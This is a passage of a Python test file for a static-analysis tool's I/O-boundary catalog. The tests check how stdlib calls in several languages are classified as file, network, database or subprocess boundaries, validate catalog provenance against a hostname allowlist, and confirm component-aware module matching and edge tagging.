        assert "fs_read" in boundaries
        assert "net_send" in boundaries

    def test_elixir_loads_own_catalog_with_erlang_parent(self) -> None:
        """WI-vibur: Elixir has its own catalog merged with Erlang parent.

        Elixir idiom uses its own modules (File, Logger, Ecto.Repo,
        Phoenix.Router, HTTPoison/Tesla/Req/Finch/Mint) but atom-access
        into Erlang is common (`:gen_tcp.send`, `:ets.lookup`). Erlang
        parent covers those atom paths; the Elixir catalog adds the
        idiomatic surface that UAT found missing on plausible (Phoenix/
        Ecto). BUG-09b: io-boundaries returned 0 boundaries before this.
        """
        catalog = load_catalog("elixir")
        assert catalog.language == "elixir"
        # Erlang parent merged in — atom-access still matched
        assert catalog.lookup("file.read_file") is not None
        # Elixir-specific primitives
        assert catalog.lookup("File.read") is not None
        assert catalog.lookup("File.write") is not None
        assert catalog.lookup("Ecto.Repo.all") is not None
        assert catalog.lookup("Ecto.Repo.insert") is not None
        assert catalog.lookup("HTTPoison.get") is not None
        assert catalog.lookup("Tesla.get") is not None
        assert catalog.lookup("Req.get") is not None
        assert catalog.lookup("Phoenix.Router.get") is not None
        assert catalog.lookup("Logger.info") is not None
        assert catalog.lookup("System.cmd") is not None

    def test_elixir_catalog_covers_all_expected_boundaries(self) -> None:
        """Elixir catalog emits every boundary kind Phoenix/Ecto apps need.

        UAT BUG-09b observed 0 boundaries on plausible. After this PR,
        at minimum fs_read, fs_write, net_send, net_recv, logging,
        db_read, db_write, subprocess, env_read, and ipc_send are all
        covered.
        """
        catalog = load_catalog("elixir")
        boundaries = {p.boundary for p in catalog.primitives}
        for expected in (
            "fs_read", "fs_write", "net_send", "net_recv", "logging",
            "db_read", "db_write", "subprocess", "env_read", "ipc_send",
        ):
            assert expected in boundaries, (
                f"Elixir catalog missing boundary kind: {expected}"
            )

    def test_elixir_catalog_io_writes_are_logging(self) -> None:
        """WI-dutah: IO.{puts,write,binwrite} are device-writes (logging).

        IO module in Elixir takes a device, not a path. The 1-arity form
        targets :stdio; the 2-arity form targets a Device (which can be a
        file handle obtained via File.open, but the primitive itself is a
        device write, not a path write). Real path-based file writes go
        through ``File.write/2`` which stays in ``fs_write``.

        Same threat-model logic as the Python sys.{stdout,stderr}
        migration (WI-tolif): device writes are logging, not fs_write
        — they don't reach the host filesystem by themselves.
        """
        catalog = load_catalog("elixir")
        for fn in ("puts", "write", "binwrite"):
            hit = catalog.lookup_with_module(fn, "IO")
            assert hit is not None, f"IO.{fn} should be in the Elixir catalog"
            assert hit.boundary == "logging", (
                f"IO.{fn} should be classified as logging, "
                f"not {hit.boundary}"
            )
        # File.write stays as fs_write — that's the real path-based write.
        hit = catalog.lookup_with_module("write", "File")
        assert hit is not None
        assert hit.boundary == "fs_write"

    def test_erlang_catalog_loads(self) -> None:
        """Erlang I/O catalog covers OTP stdlib, networking, ETS/Mnesia, and process primitives."""
        catalog = load_catalog("erlang")
        assert len(catalog.primitives) > 0
        boundaries = {p.boundary for p in catalog.primitives}
        assert "fs_read" in boundaries
        assert "fs_write" in boundaries
        assert "net_send" in boundaries
        assert "net_recv" in boundaries
        assert "db_read" in boundaries
        assert "db_write" in boundaries
        assert "process_send" in boundaries

    def test_erlang_catalog_lookups(self) -> None:
        """Key Erlang I/O primitives are findable by short name and module hint."""
        catalog = load_catalog("erlang")
        # Short name lookup
        assert catalog.lookup("read_file") is not None
        assert catalog.lookup("read_file").boundary == "fs_read"
        # Module-hinted lookup for disambiguation
        tcp_send = catalog.lookup_with_module("send", "gen_tcp")
        assert tcp_send is not None
        assert tcp_send.boundary == "net_send"
        # ETS lookup
        ets_insert = catalog.lookup_with_module("insert", "ets")
        assert ets_insert is not None
        assert ets_insert.boundary == "db_write"
        # gen_server:call is process send
        gs_call = catalog.lookup_with_module("call", "gen_server")
        assert gs_call is not None
        assert gs_call.boundary == "process_send"

    def test_catalog_from_yaml(self, tmp_path: Path) -> None:
        yaml_content = """\
language: testlang
status: in_progress

fs_read:
  - module: io
    functions: [read_file, load]
  - module: io.Path
    methods: [read_text]

net_send:
  - module: net
    functions: [send]
"""
        yaml_file = tmp_path / "testlang.yaml"
        yaml_file.write_text(yaml_content)
        catalog = IoBoundaryCatalog.from_yaml(yaml_file)
        assert catalog.language == "testlang"
        assert len(catalog.primitives) == 4
        assert catalog.lookup("io.read_file").boundary == "fs_read"
        assert catalog.lookup("io.Path.read_text").boundary == "fs_read"
        assert catalog.lookup("net.send").boundary == "net_send"

    def test_haskell_catalog_loads(self) -> None:
        """Haskell I/O catalog covers file I/O, network, process, env, and logging."""
        catalog = load_catalog("haskell")
        assert catalog.language == "haskell"
        assert len(catalog.primitives) > 0
        boundaries = {p.boundary for p in catalog.primitives}
        assert "fs_read" in boundaries
        assert "fs_write" in boundaries
        assert "net_send" in boundaries
        assert "net_recv" in boundaries
        assert "subprocess" in boundaries
        assert "env_read" in boundaries
        assert "logging" in boundaries

    def test_haskell_catalog_lookups(self) -> None:
        """Key Haskell I/O primitives are findable by short name and module hint."""
        catalog = load_catalog("haskell")
        # Prelude I/O
        assert catalog.lookup("readFile") is not None
        assert catalog.lookup("readFile").boundary == "fs_read"
        assert catalog.lookup("writeFile") is not None
        assert catalog.lookup("writeFile").boundary == "fs_write"
        # Module-hinted lookup
        sock_send = catalog.lookup_with_module("send", "Network.Socket")
        assert sock_send is not None
        assert sock_send.boundary == "net_send"
        # Process
        assert catalog.lookup("callProcess") is not None
        assert catalog.lookup("callProcess").boundary == "subprocess"
        # Environment
        assert catalog.lookup("getArgs") is not None
        assert catalog.lookup("getArgs").boundary == "env_read"
        # Logging (putStrLn is in Prelude)
        putstrln = catalog.lookup_with_module("putStrLn", "Prelude")
        assert putstrln is not None
        assert putstrln.boundary == "logging"

    def test_haskell_catalog_has_all_boundary_types(self) -> None:
        catalog = load_catalog("haskell")
        boundaries = {p.boundary for p in catalog.primitives}
        expected = {"fs_read", "fs_write", "net_send", "net_recv", "subprocess", "env_read"}
        assert expected.issubset(boundaries)

    def test_load_objc_catalog(self) -> None:
        catalog = load_catalog("objc")
        assert catalog.language == "objc"
        assert len(catalog.primitives) > 0

    def test_objc_catalog_has_all_boundary_types(self) -> None:
        catalog = load_catalog("objc")
        boundaries = {p.boundary for p in catalog.primitives}
        expected = {
            "fs_read", "fs_write", "net_send", "net_recv",
            "db_read", "db_write", "subprocess", "env_read",
            "logging", "ipc_send", "ipc_recv",
        }
        assert expected.issubset(boundaries), (
            f"Missing boundaries: {expected - boundaries}"
        )

    def test_objc_catalog_lookups(self) -> None:
        """ObjC catalog matches Foundation I/O selectors."""
        catalog = load_catalog("objc")
        # NSFileManager fs_write
        hit = catalog.lookup("removeItemAtPath:error:")
        assert hit is not None
        assert hit.boundary == "fs_write"
        # NSURLSession net_send
        hit2 = catalog.lookup("dataTaskWithRequest:completionHandler:")
        assert hit2 is not None
        assert hit2.boundary == "net_send"
        # NSManagedObjectContext db_read
        hit3 = catalog.lookup("executeFetchRequest:error:")
        assert hit3 is not None
        assert hit3.boundary == "db_read"
        # NSLog logging
        hit4 = catalog.lookup("NSLog")
        assert hit4 is not None
        assert hit4.boundary == "logging"

    def test_objc_catalog_loads(self) -> None:
        """The 'objc' catalog loads and contains Foundation IO primitives.

        Was previously a test of the 'objective-c' → 'objc' alias before the
        language-tag harmonization; the alias has been removed and 'objc' is
        now the consistent canonical value across emit, IDs, and catalog.
        """
        catalog = load_catalog("objc")
        assert len(catalog.primitives) > 0
        hit = catalog.lookup("removeItemAtPath:error:")
        assert hit is not None


class TestCatalogStatus:
    """Plan C, PR B: catalog ``status`` + ``stdlib_provenance`` validation.

    Catalogs declare ``status: complete | in_progress`` plus an optional
    ``stdlib_provenance`` block.  ``status: complete`` (explicit OR
    defaulted when both ``status`` and ``stdlib_provenance`` are absent)
    REQUIRES a ``stdlib_provenance`` block whose ``source_url`` is an
    HTTPS URL whose hostname suffix-matches
    :data:`ALLOWED_PROVENANCE_HOSTNAME_SUFFIXES`.  Catalogs with
    ``status: in_progress`` may omit provenance.
    """

    def test_default_status_is_complete_when_absent(self) -> None:
        # status defaulted; complete provenance provided ⇒ status="complete".
        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        data = {
            "language": "fakelang",
            "stdlib_provenance": {
                "source_url": "https://docs.python.org/3.13/library/index.html",
                "version": "3.13",
                "retrieved": "2026-04-23",
            },
        }
        catalog = IoBoundaryCatalog._from_dict(data)
        assert catalog.status == "complete"

    def test_in_progress_status_does_not_require_provenance(self) -> None:
        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        data = {"language": "fakelang", "status": "in_progress"}
        catalog = IoBoundaryCatalog._from_dict(data)
        assert catalog.status == "in_progress"
        assert catalog.stdlib_provenance is None

    def test_complete_status_requires_provenance_source_url(self) -> None:
        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        data = {"language": "fakelang", "status": "complete"}
        with pytest.raises(ValueError, match="stdlib_provenance"):
            IoBoundaryCatalog._from_dict(data)

    def test_complete_status_requires_provenance_when_block_present_but_no_url(
        self,
    ) -> None:
        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        data = {
            "language": "fakelang",
            "status": "complete",
            "stdlib_provenance": {"version": "3.13"},  # no source_url
        }
        with pytest.raises(ValueError, match="source_url"):
            IoBoundaryCatalog._from_dict(data)

    def test_provenance_url_must_be_https(self) -> None:
        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        data = {
            "language": "fakelang",
            "status": "complete",
            "stdlib_provenance": {
                "source_url": "http://docs.python.org/3.13/library/index.html",
                "version": "3.13",
                "retrieved": "2026-04-23",
            },
        }
        with pytest.raises(ValueError, match="https"):
            IoBoundaryCatalog._from_dict(data)

    def test_provenance_url_hostname_must_suffix_match_allowlist(self) -> None:
        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        data = {
            "language": "fakelang",
            "status": "complete",
            "stdlib_provenance": {
                "source_url": "https://evil.example.com/python/",
                "version": "3.13",
                "retrieved": "2026-04-23",
            },
        }
        with pytest.raises(ValueError, match="allowlist"):
            IoBoundaryCatalog._from_dict(data)

    def test_provenance_url_with_allowlisted_suffix_loads_cleanly(self) -> None:
        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        data = {
            "language": "fakelang",
            "status": "complete",
            "stdlib_provenance": {
                "source_url": "https://docs.python.org/3.13/library/index.html",
                "version": "3.13",
                "retrieved": "2026-04-23",
            },
        }
        catalog = IoBoundaryCatalog._from_dict(data)
        assert catalog.stdlib_provenance is not None
        assert catalog.stdlib_provenance["source_url"].startswith(
            "https://docs.python.org",
        )

    def test_provenance_url_with_bare_allowlisted_hostname_loads_cleanly(
        self,
    ) -> None:
        # Bare hostname (no subdomain) like "python.org" should pass too.
        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        data = {
            "language": "fakelang",
            "status": "complete",
            "stdlib_provenance": {
                "source_url": "https://python.org/",
                "version": "3.13",
                "retrieved": "2026-04-23",
            },
        }
        catalog = IoBoundaryCatalog._from_dict(data)
        assert catalog.stdlib_provenance is not None

    def test_invalid_status_value_raises(self) -> None:
        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        data = {"language": "fakelang", "status": "wat"}
        with pytest.raises(ValueError, match="status"):
            IoBoundaryCatalog._from_dict(data)

    def test_provenance_must_be_dict(self) -> None:
        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        data = {
            "language": "fakelang",
            "status": "in_progress",
            "stdlib_provenance": "https://python.org/",  # str, not dict
        }
        with pytest.raises(ValueError, match="stdlib_provenance"):
            IoBoundaryCatalog._from_dict(data)

    def test_python_catalog_is_complete_with_provenance(self) -> None:
        # The shipped Python catalog must declare status=complete with a
        # valid stdlib_provenance block. This is the worked example.
        catalog = load_catalog("python")
        assert catalog.status == "complete"
        assert catalog.stdlib_provenance is not None
        assert catalog.stdlib_provenance["source_url"].startswith("https://")

    def test_rust_catalog_is_complete_with_provenance(self) -> None:
        # WI-tukif batch 1: Rust catalog audited against doc.rust-lang.org/std/
        # 2026-05-24 (Rust 1.78 stable).
        catalog = load_catalog("rust")
        assert catalog.status == "complete"
        assert catalog.stdlib_provenance is not None
        assert catalog.stdlib_provenance["source_url"].startswith(
            "https://doc.rust-lang.org",
        )

    def test_erlang_catalog_is_complete_with_provenance(self) -> None:
        # WI-tukif batch 1: Erlang catalog audited against erlang.org/doc/
        # 2026-05-24 (OTP 26).
        catalog = load_catalog("erlang")
        assert catalog.status == "complete"
        assert catalog.stdlib_provenance is not None
        assert catalog.stdlib_provenance["source_url"].startswith(
            "https://erlang.org",
        )

    def test_other_catalogs_declare_status_in_progress(self) -> None:
        # WI-tukif (Plan C, PR B) is promoting these catalogs incrementally.
        # As each lands with status=complete + stdlib_provenance, remove it
        # from this list. The catalogs still pending audit must continue to
        # declare status=in_progress.
        for lang in (
            "c", "elixir", "go", "haskell", "java", "javascript",
            "kotlin", "objc", "scala", "swift",
        ):
            catalog = load_catalog(lang)
            assert catalog.status == "in_progress", (
                f"{lang}.yaml must declare status=in_progress until a "
                f"follow-up PR promotes it to complete with provenance."
            )

    def test_allowlist_includes_core_language_doc_hosts(self) -> None:
        from hypergumbo_core.io_boundary import (
            ALLOWED_PROVENANCE_HOSTNAME_SUFFIXES,
        )

        # Spot-check the major-language doc hosts the allowlist must cover.
        # This is the contract the catalog-completion backlog leans on.
        for host in (
            "python.org", "golang.org", "rust-lang.org", "nodejs.org",
            "oracle.com", "openjdk.org", "kotlinlang.org",
            "scala-lang.org", "swift.org", "haskell.org", "erlang.org",
            "elixir-lang.org", "apple.com", "developer.apple.com",
            "cppreference.com", "gnu.org",
        ):
            assert host in ALLOWED_PROVENANCE_HOSTNAME_SUFFIXES, (
                f"{host!r} should be in ALLOWED_PROVENANCE_HOSTNAME_SUFFIXES "
                f"because it hosts an official stdlib doc."
            )


class TestStdlibOther:
    """Plan C, PR B: ``stdlib_other`` (non-IO stdlib symbols) section.

    Catalogs may declare a ``stdlib_other:`` section enumerating stdlib
    symbols that are NOT I/O primitives (e.g., ``math.sqrt``).  These
    feed the PR C ``external_potential`` filter — a first-party call to
    ``math.sqrt`` is stdlib (so not "untrusted external"), but it's also
    not an I/O primitive.  Without this section, the filter has no way
    to distinguish "stdlib non-IO" from "third-party not-yet-catalogued".
    """

    def test_stdlib_other_section_parses_into_dedicated_field(self) -> None:
        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        data = {
            "language": "fakelang",
            "status": "in_progress",
            "stdlib_other": [
                {"module": "math", "functions": ["sqrt", "sin", "cos"]},
                {"module": "collections", "methods": ["get", "items"]},
                {"module": "sys", "attributes": ["version_info"]},
            ],
        }
        catalog = IoBoundaryCatalog._from_dict(data)
        assert "math.sqrt" in catalog.stdlib_other
        assert "math.sin" in catalog.stdlib_other
        assert "math.cos" in catalog.stdlib_other
        assert "collections.get" in catalog.stdlib_other
        assert "collections.items" in catalog.stdlib_other
        assert "sys.version_info" in catalog.stdlib_other

    def test_stdlib_other_symbols_are_not_matched_as_io_primitives(self) -> None:
        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        data = {
            "language": "fakelang",
            "status": "in_progress",
            "stdlib_other": [{"module": "math", "functions": ["sqrt"]}],
        }
        catalog = IoBoundaryCatalog._from_dict(data)
        # math.sqrt is stdlib-but-not-IO; it MUST NOT appear in the IO
        # primitive index.
        assert catalog.lookup("math.sqrt") is None
        # But it IS marked as stdlib (used by the PR C external_potential
        # filter to drop "stdlib non-IO" calls from the bucket).
        assert "math.sqrt" in catalog.stdlib_other

    def test_stdlib_other_absent_yields_empty_set(self) -> None:
        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        data = {"language": "fakelang", "status": "in_progress"}
        catalog = IoBoundaryCatalog._from_dict(data)
        assert catalog.stdlib_other == frozenset()

    def test_stdlib_other_non_dict_entries_are_skipped(self) -> None:
        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        data = {
            "language": "fakelang",
            "status": "in_progress",
            "stdlib_other": [
                "not_a_dict",  # skipped
                {"module": "math", "functions": ["sqrt"]},
            ],
        }
        catalog = IoBoundaryCatalog._from_dict(data)
        assert catalog.stdlib_other == frozenset({"math.sqrt"})

    def test_stdlib_other_non_list_yields_empty_set(self) -> None:
        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        data = {
            "language": "fakelang",
            "status": "in_progress",
            "stdlib_other": "not_a_list",
        }
        catalog = IoBoundaryCatalog._from_dict(data)
        assert catalog.stdlib_other == frozenset()

    def test_stdlib_other_inherits_from_parent_via_merge(self) -> None:
        from hypergumbo_core.io_boundary import IoBoundaryCatalog

        parent = IoBoundaryCatalog._from_dict({
            "language": "java",
            "status": "in_progress",
            "stdlib_other": [{"module": "java.lang.Math", "methods": ["abs"]}],
        })
        child = IoBoundaryCatalog._from_dict({
            "language": "kotlin",
            "status": "in_progress",
            "stdlib_other": [{"module": "kotlin.math", "functions": ["abs"]}],
        })
        merged = child.merge(parent)
        assert "java.lang.Math.abs" in merged.stdlib_other
        assert "kotlin.math.abs" in merged.stdlib_other


class TestMatchEdgeToPrimitive:
    """Tests for matching call edges to I/O primitives."""

    def test_match_simple_function_call(self) -> None:
        catalog = load_catalog("python")
        # Simulate a call edge where the target is "os.listdir"
        result = match_edge_to_primitive(catalog, "os.listdir")
        assert result is not None
        assert result.boundary == "fs_read"

    def test_match_method_call(self) -> None:
        catalog = load_catalog("python")
        result = match_edge_to_primitive(catalog, "pathlib.Path.read_text")
        assert result is not None
        assert result.boundary == "fs_read"

    def test_no_match_for_non_io(self) -> None:
        catalog = load_catalog("python")
        result = match_edge_to_primitive(catalog, "math.sqrt")
        assert result is None

    def test_match_unqualified_name(self) -> None:
        catalog = load_catalog("python")
        # Short name matching: "listdir" should match "os.listdir"
        result = match_edge_to_primitive(catalog, "listdir")
        assert result is not None
        assert result.boundary == "fs_read"

    def test_open_matches_both_fs_read_and_fs_write(self) -> None:
        catalog = load_catalog("python")
        results = catalog.lookup_all("open")
        boundaries = {r.boundary for r in results}
        assert "fs_read" in boundaries
        assert "fs_write" in boundaries

    def test_lookup_all_qualified_name(self) -> None:
        catalog = load_catalog("python")
        results = catalog.lookup_all("os.listdir")
        assert len(results) == 1
        assert results[0].boundary == "fs_read"

    def test_dot_normalized_qualified_name_alias(self) -> None:
        """WI-vipur: ``IoBoundaryCatalog`` registers a dot-normalized
        form of every qualified name whose module contains ``::``,
        so edges emitted in scoped-path mode (``::`` replaced with
        ``.`` to avoid colliding with the ``:``-delimited edge ID
        format) still hit the qualified lookup index.
        """
        catalog = load_catalog("rust")
        # rust.yaml declares ``module: std::env, attributes: [consts]``
        # → qualified_name ``std::env.consts``.  The scoped-path edge
        # emitter normalizes this to ``std.env.consts`` in its dst,
        # so the lookup must find the primitive under that form too.
        assert catalog.lookup("std::env.consts") is not None
        assert catalog.lookup("std.env.consts") is not None
        assert catalog.lookup("std::env.consts") is catalog.lookup(
            "std.env.consts"
        )
        # A module name without ``::`` is not re-registered as itself,
        # so ``os.Stdout`` (Go) continues to have exactly one entry.
        go_catalog = load_catalog("go")
        # Go's module names don't contain ``::`` so the dot-form alias
        # is a no-op for Go entries.
        stdout = go_catalog.lookup("os.Stdout")
        assert stdout is not None

    def test_catalog_ignores_malformed_yaml_entries(self, tmp_path: Path) -> None:
        """Non-list boundary values and non-dict entries are skipped."""
        yaml_content = """\
language: broken
status: in_progress

fs_read: "not a list"

fs_write:
  - "not a dict"
  - module: ok
    functions: [write_file]
"""
        yaml_file = tmp_path / "broken.yaml"
        yaml_file.write_text(yaml_content)
        catalog = IoBoundaryCatalog.from_yaml(yaml_file)
        assert catalog.language == "broken"
        assert len(catalog.primitives) == 1
        assert catalog.primitives[0].name == "write_file"


class TestModuleMatches:
    """Tests for _module_matches helper."""

    def test_exact_match(self) -> None:
        assert _module_matches("net.Conn", "net.Conn") is True

    def test_catalog_is_prefix(self) -> None:
        assert _module_matches("java.io", "java.io.FileInputStream") is True

    def test_edge_is_prefix(self) -> None:
        assert _module_matches("java.io.FileInputStream", "java.io") is True

    def test_no_match(self) -> None:
        assert _module_matches("net.Conn", "crypto/rand") is False

    def test_rust_double_colon(self) -> None:
        assert _module_matches("std::fs", "std::fs::File") is True

    def test_go_slash_vs_dot(self) -> None:
        assert _module_matches("os/exec", "os.exec.Cmd") is True

    def test_case_insensitive_swift_variable_receiver(self) -> None:
        """Swift variable names (camelCase) should match PascalCase catalog modules."""
        # Variable 'channel' should match catalog module 'Channel'
        assert _module_matches("Channel", "channel") is True

    def test_case_insensitive_context_matches_handler_context(self) -> None:
        """Variable 'context' should match 'ChannelHandlerContext'."""
        assert _module_matches("ChannelHandlerContext", "context") is True

    def test_case_insensitive_fileio_matches_nonblockingfileio(self) -> None:
        """Variable 'fileIO' should match 'NonBlockingFileIO'."""
        assert _module_matches("NonBlockingFileIO", "fileIO") is True

    def test_case_insensitive_preserves_rejection(self) -> None:
        """Unrelated modules should still not match even case-insensitively."""
        assert _module_matches("Channel", "request") is False
        assert _module_matches("FileManager", "logger") is False


class TestModuleMatchesIsComponentAware:
    """WI-zazul: the predicate must not substring-match module paths.

    It used to normalise ``::`` and ``/`` to ``.`` and then ask
    ``cm in em or em in cm`` -- bidirectional, case-insensitive SUBSTRING
    containment. 25 of the 210 catalog sink modules are four characters or
    fewer (``os``, ``io``, ``fs``, ``net``, ``log``, ``http``, ``sys``, ...), so
    each matched ANY module whose normalised path merely contained it.

    Found by the 2026-08-01 taint cohort over 9 fresh external repos, which is
    what moved INV-karud to ``violated``. Measured on hypergumbo's own tree the
    predicate looked clean -- 110 flows, 110 realizable, 0 suspect -- and every
    defect below is Go or JavaScript. It is a language-coverage gap that only
    fresh substrate exposes.

    The replacement is component-aware: normalise separators, split on ``.``,
    and require one component sequence to be a PREFIX of the other. Where the
    prefix is strict, the first EXTRA component decides -- capitalised means a
    type inside the matched package (``os/exec`` + ``Cmd``), lowercase means a
    sibling or sub-package (``net/http`` + ``fcgi``), which is a different
    module and must not match. That discriminant is needed because the Go
    analyzer emits ``os.exec.Cmd`` for what the catalog spells ``os/exec``, so
    the separator itself cannot be trusted to mark the package boundary.
    """

    # (catalog_module, edge_module_hint, why) — every one of these returned
    # True under substring containment.
    @pytest.mark.parametrize(
        "catalog,hint,why",
        [
            ("os", "chaos", "'os' is a substring of 'chaos'"),
            ("io", "audio", "'io' is a substring of 'audio'"),
            ("log", "dialog", "'log' is a substring of 'dialog'"),
            ("fs", "dfs.client", "'fs' is a substring of 'dfs'"),
            ("net/http", "net/http/fcgi", "fcgi is a SIBLING package, not a type"),
            ("net/http", "net/http/httptest",
             "httptest.NewRequest builds a request and performs NO network IO"),
            ("net/smtp.Client", "net", "'net' is a prefix component only"),
            ("grpc",
             "go.opentelemetry.io/otel/exporters/otlp/otlptrace/otlptracegrpc",
             "the module path merely ENDS in 'grpc'"),
        ],
    )
    def test_substring_collisions_no_longer_match(
        self, catalog: str, hint: str, why: str,
    ) -> None:
        assert _module_matches(catalog, hint) is False, (
            f"{catalog!r} still matches {hint!r} — {why}"
        )

    def test_zone_flipping_collision(self) -> None:
        """The one catalog-internal pair that changes the ZONE, not just the primitive.

        ``sys.process.Process`` is host_fs and ``sys.process.ProcessBuilder`` is
        subprocess, and the former is literally a substring of the latter, so a
        Scala ``run`` could be attributed to the wrong zone entirely rather than
        merely to the wrong primitive.
        """
        assert _module_matches(
            "sys.process.Process", "sys.process.ProcessBuilder",
        ) is False

    @pytest.mark.parametrize(
        "catalog,hint",
        [
            ("os", "os"),                          # identical
            ("net.Conn", "net.Conn"),
            ("java.io", "java.io.FileInputStream"),  # type within package
            ("std::fs", "std::fs::File"),            # Rust path separator
            ("os/exec", "os.exec.Cmd"),              # slash catalog, dotted hint
            ("net/http", "net/http.Client"),         # exported type, not a package
            # Dropped qualification — the hint is the unqualified tail. This is
            # how source actually spells these, so it is load-bearing rather
            # than lenient: Go writes `http.Get` after importing `net/http`,
            # and Java writes `System.in` for `java.lang.System.in`.
            ("java.lang.System", "System"),
            ("net/http", "http"),
            ("net.Conn", "Conn"),
        ],
    )
    def test_legitimate_matches_survive(self, catalog: str, hint: str) -> None:
        """Non-vacuity floor (L17): the fix must not be 'return False'.

        Without these, deleting the predicate's body would satisfy every
        assertion above.
        """
        assert _module_matches(catalog, hint) is True, (
            f"{catalog!r} should still match {hint!r}"
        )

    @pytest.mark.parametrize(
        "catalog,hint",
        [
            ("Channel", "channel"),
            ("ChannelHandlerContext", "context"),
            ("NonBlockingFileIO", "fileIO"),
        ],
    )
    def test_swift_receiver_variable_carve_out_survives(
        self, catalog: str, hint: str,
    ) -> None:
        """Swift hints are receiver VARIABLE names, so they need their own rule.

        The analyzer extracts a camelCase variable where the catalog names a
        PascalCase type, and the variable is frequently the type's trailing
        word(s). Component matching cannot express that, so it is an explicit
        carve-out — and its DIRECTION is the safety property: the catalog name
        may end with the hint (a variable named after its type), never the
        reverse. ``'chaos'.endswith('os')`` is the bug; ``'NonBlockingFileIO'
        .endswith('fileIO')`` is the feature, and only one direction is allowed.
        """
        assert _module_matches(catalog, hint) is True

    def test_swift_carve_out_requires_a_word_boundary(self) -> None:
        """The carve-out is bounded, so it cannot re-admit the bug it excludes.

        A suffix that starts mid-word is not a receiver variable named after
        its type; requiring the split to land on a capital keeps the carve-out
        from degenerating back into substring containment for short names.
        """
        assert _module_matches("os", "s") is False
        assert _module_matches("Channel", "nel") is False


class TestExtractModuleHint:
    """Tests for _extract_module_hint helper."""

    def test_unresolved_edge(self) -> None:
        assert _extract_module_hint("go:net.Conn:0-0:Read:unresolved") == "net.Conn"

    def test_external_fallback(self) -> None:
        assert _extract_module_hint("go:external:0-0:Read:unresolved") == "external"

    def test_file_path_returns_none(self) -> None:
        assert _extract_module_hint("python:/path/to/file.py:1-5:func:function") is None

    def test_short_id(self) -> None:
        assert _extract_module_hint("a:b") is None


class TestExtractCalleeName:
    """Tests for _extract_callee_name."""

    def test_standard_symbol_id(self) -> None:
        sid = "python:/path/to/file.py:10-12:os.listdir:function"
        assert _extract_callee_name(sid) == "os.listdir"

    def test_method_symbol_id(self) -> None:
        sid = "python:/path/file.py:5-7:pathlib.Path.read_text:method"
        assert _extract_callee_name(sid) == "pathlib.Path.read_text"

    def test_minimal_id(self) -> None:
        sid = "a:b"
        assert _extract_callee_name(sid) == "a"

    def test_bare_name(self) -> None:
        sid = "nodelimiters"
        assert _extract_callee_name(sid) == "nodelimiters"

    def test_objc_colon_selector_unresolved(self) -> None:
        """ObjC selectors with colons are extracted correctly from unresolved edges."""
        sid = "objc:external:0-0:removeItemAtPath:error::unresolved"
        assert _extract_callee_name(sid) == "removeItemAtPath:error:"

    def test_objc_colon_selector_resolved(self) -> None:
        """ObjC selectors with colons are extracted correctly from resolved edges."""
        sid = "objc:/path/file.m:10-20:Manager.removeItemAtPath:error::method"
        assert _extract_callee_name(sid) == "Manager.removeItemAtPath:error:"

    def test_objc_simple_selector(self) -> None:
        """Simple ObjC selectors (no colons) still work."""
        sid = "objc:external:0-0:defaultManager:unresolved"
        assert _extract_callee_name(sid) == "defaultManager"


class TestTagIoBoundaries:
    """Tests for the boundary-tagging pass."""

    def _make_edge(self, src: str, dst: str, edge_type: str = "calls"):
        """Create a minimal Edge-like object for testing."""
        from dataclasses import dataclass, field as dc_field
        from typing import Optional, Dict, Any

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str
            meta: Optional[Dict[str, Any]] = None

        return MockEdge(src=src, dst=dst, edge_type=edge_type, meta=None)

    def test_tags_call_to_io_primitive(self) -> None:
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/app/main.py:10-12:main:function",
            dst="python:/stdlib/os.py:100-102:os.listdir:function",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1
        assert edge.meta is not None
        assert edge.meta["io_boundary"] == "fs_read"
        assert edge.meta["io_primitive"] == "os.listdir"

    def test_skips_non_call_edges(self) -> None:
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/app/main.py:1:mod:module",
            dst="python:/stdlib/os.py:1:os:module",
            edge_type="contains",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 0
        assert edge.meta is None

    def test_tags_a_constructor_call_to_an_io_primitive(self) -> None:
        """INV-motos: a CONSTRUCTOR IS A CALL SITE.

        ``instantiates`` was absent from ``call_types`` while the coverage
        gate's ``_CALL_SITE_EDGE_TYPES`` carried it, so a constructor-shaped
        catalogued primitive was counted EXAMINED by the gate and was
        structurally untaggable here — and "no chains found" became
        ``confirmed``. The dst shape is copied from a real survey of a
        two-line fixture, not invented: python emits ``instantiates`` with
        ``evidence_type: ast_new`` for ``subprocess.Popen([...])``.

        Measured on the shipped CLI at filing, claim
        ``{boundary: subprocess, must_not_exist: true}``::

            subprocess.Popen([...])   ->  confirmed  rc 0   <- the defect
            subprocess.run([...])     ->  violated   rc 1   <- the control

        Same claim, adjacent catalogue rows, only the edge type differing.
        """
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/app/main.py:4-6:main:function",
            dst="python:subprocess:0-0:Popen:external_symbol",
            edge_type="instantiates",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1, (
            "a constructor that IS the I/O primitive went untagged; the gate "
            "counts this edge as examined, so the chain is the only thing "
            "standing between it and a false all-clear"
        )
        assert edge.meta is not None
        assert edge.meta["io_boundary"] == "subprocess"
        assert edge.meta["io_primitive"] == "subprocess.Popen"

    def test_the_function_form_of_the_same_primitive_was_always_tagged(
        self,
    ) -> None:
        """THE CONTROL for the test above, and the reason the defect hid.

        ``subprocess.run`` and ``subprocess.Popen`` are adjacent rows in one
        catalogue block with one boundary. The call-shaped one has always been
        tagged, so every fixture and every corpus number written against
        ``run`` looked correct while ``Popen`` was invisible.
        """
        catalog = load_catalog("python")
